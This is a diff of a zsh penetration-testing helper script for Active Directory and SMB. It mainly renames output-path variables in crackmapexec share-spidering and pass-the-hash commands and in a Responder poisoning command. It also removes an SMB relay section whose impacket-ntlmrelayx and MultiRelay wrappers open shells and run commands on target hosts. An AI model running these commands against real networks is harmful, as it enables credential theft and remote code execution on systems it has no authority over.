@@ -75,15 +75,6 @@ nb-ad-smb-responder                  spoof and get responses using responder
 nb-ad-smb-net-use-null               print a net use statement for windows
 nb-ad-smb-nbtscan                    scan a local network 
 
-SMB Relay
----------
-nb-ad-smb-relay-install              installs dependencies
-nb-ad-smb-relay-enum                 identify hosts without smb signing
-nb-ad-smb-relay-ntlmrelay            relay the captured SMB requests by responder
-nb-ad-smb-relay-ntlmrelay-shell      get interactive shell
-nb-ad-smb-relay-ntlmrelay-command    execute a shell command on a target host using impacket-ntlmrelayx
-nb-ad-smb-relay-multirelay-command   responder's alternative to impacket-ntlmrelayx - execute a shell command on a target host
-
 DOC
 }
 
@@ -238,7 +229,7 @@ nb-ad-smb-null-cme-spider() {
     __ask "Enter name of the share to spider"
     __check-share
 
-    print -z "crackmapexec smb ${__NETWORK} -u '' -p '' -M spider_plus --share '${__SHARE}' | tee $(__netadpath)/cme-null-shares-spider-sweep.txt"
+    print -z "crackmapexec smb ${__NETWORK} -u '' -p '' -M spider_plus --share '${__SHARE}' | tee $(__netpath)/cme-null-shares-spider-sweep.txt"
     __ok "Results have been written to /tmp/cme_spider_plus/${__NETWORK}.json"
 }
 
@@ -261,17 +252,17 @@ nb-ad-smb-auth-cme-spider() {
             nb-vars-set-domain
             __ask "Enter a password for authentication"
             nb-vars-set-pass
-            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -d ${__DOMAIN} -p '${__PASS}' -M spider_plus --share '${__SHARE}' | tee $(__netadpath)/cme-shares-spider-sweep.txt"
+            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -d ${__DOMAIN} -p '${__PASS}' -M spider_plus --share '${__SHARE}' | tee $(__netpath)/cme-shares-spider-sweep.txt"
         else
             __ask "Enter a password for authentication"
             nb-vars-set-pass
-            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -p '${__PASS}' -M spider_plus --share '${__SHARE}' | tee $(__netadpath)/cme-shares-spider-sweep.txt"
+            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -p '${__PASS}' -M spider_plus --share '${__SHARE}' | tee $(__netpath)/cme-shares-spider-sweep.txt"
         fi
     elif [[ $login == "h" ]]; then
         echo
         __ask "Enter the NTLM hash for authentication"
         __check-hash
-  	    print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -H ${__HASH} --local-auth -M spider_plus --share '${__SHARE}' | tee $(__netadpath)/cme-shares-spider-sweep.txt"
+  	    print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -H ${__HASH} --local-auth -M spider_plus --share '${__SHARE}' | tee $(__netpath)/cme-shares-spider-sweep.txt"
     else
         echo
         __err "Invalid option. Please choose 'p' for password or 'h' for hash."
@@ -296,17 +287,17 @@ nb-ad-smb-auth-cme-list() {
             nb-vars-set-domain
             __ask "Enter a password for authentication"
             nb-vars-set-pass
-            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -d ${__DOMAIN} -p '${__PASS}' --shares | tee $(__netadpath)/cme-shares-enum-sweep.txt"
+            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -d ${__DOMAIN} -p '${__PASS}' --shares | tee $(__netpath)/cme-shares-enum-sweep.txt"
         else
             __ask "Enter a password for authentication"
             nb-vars-set-pass
-            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -p '${__PASS}' --shares | tee $(__netadpath)/cme-shares-enum-sweep.txt"
+            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -p '${__PASS}' --shares | tee $(__netpath)/cme-shares-enum-sweep.txt"
         fi
     elif [[ $login == "h" ]]; then
         echo
         __ask "Enter the NTLM hash for authentication"
         __check-hash
-  	    print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -H ${__HASH} --local-auth --shares | tee $(__netadpath)/cme-shares-enum-sweep.txt"
+  	    print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -H ${__HASH} --local-auth --shares | tee $(__netpath)/cme-shares-enum-sweep.txt"
     else
         echo
         __err "Invalid option. Please choose 'p' for password or 'h' for hash."
@@ -386,7 +377,7 @@ nb-ad-smb-auth-samrdump() {
 nb-ad-smb-responder() {
   __check-project
   nb-vars-set-iface
-  print -z "sudo responder -I ${__IFACE} -dwP | tee $(__domadpath)/smb-responder.txt"
+  print -z "sudo responder -I ${__IFACE} -dwP | tee $(__netpath)/smb-responder.txt"
 }
 
 nb-ad-smb-net-use-null() {
@@ -413,64 +404,4 @@ nb-ad-smb-auth-rpcclient() {
   nb-vars-set-user
   nb-vars-set-pass
   print -z "rpcclient -U \"${__USER}\" --password ${__PASS} ${__RHOST}"
-}
-
-nb-ad-smb-relay-enum() {
-    __check-project
-  	nb-vars-set-network
-
-    print -z "sudo grc nmap -v --script=smb2-security-mode -p 445 ${__NETWORK} -oA $(netadpath)/nmap-smb-security"
-}
-
-nb-ad-smb-relay-ntlmrelay() {
-    __check-project
-
-    __ask "Did you disable SMB in /etc/responder/Responder.conf? (y/n)"
-	  local sm && __askvar sm SMB_OPTION
-    if [[ $sm == "n" ]]; then
-      __err "First disable SMB in /etc/responder/Responder.conf."
-      __info "sudo nvim /etc/responder/Responder.conf"
-      exit 1
-    fi
-
-    __ask "Did you first run responder? (y/n)"
-	  local rp && __askvar rp RESPONDER
-
-    if [[ $rp == "n" ]]; then
-      __err "Run first responder to relay the smb request"
-      __info "nb-ad-smb-responder"
-      exit 1
-    fi
-
-	  __ask "Enter a targets list file"
-	  local targets && __askvar targets TARGETS
-
-    print -z "sudo impacket-ntlmrelayx -tf ${targets} -smb2support | tee $(__domadpath)/ntlmrelayx.txt"
-}
-
-nb-ad-smb-relay-ntlmrelay-shell() {
-    __check-project
-	  __ask "Enter a targets list file"
-	  local targets && __askvar targets TARGETS
-
-    print -z "sudo impacket-ntlmrelayx -tf ${targets} -smb2support -i | tee $(__domadpath)/ntlmrelayx-shell.txt"
-}
-
-nb-ad-smb-relay-ntlmrelay-command() {
-    __check-project
-	  __ask "Enter a targets list file"
-	  local targets && __askvar targets TARGETS
-	  local cm && __askvar cm COMMAND
-
-	  print -z "sudo impacket-ntlmrelayx -tf ${targets} -smb2support -c '$cm' | tee $(__domadpath)/ntlmrelayx-command.txt"
-}
-
-nb-ad-smb-relay-multirelay-command() {
-    __check-project
-	  __ask "Enter the IP address of the target DC server"
-	  nb-vars-set-rhost
-	  __ask "Enter a shell command to execute"
-	  local command && __askvar command COMMAND
-
-	  print -z "responder-multirelay -t ${__RHOST} -c ${command} -u ALL | tee $(__domadpath)/responder-multirelay.txt"
 }
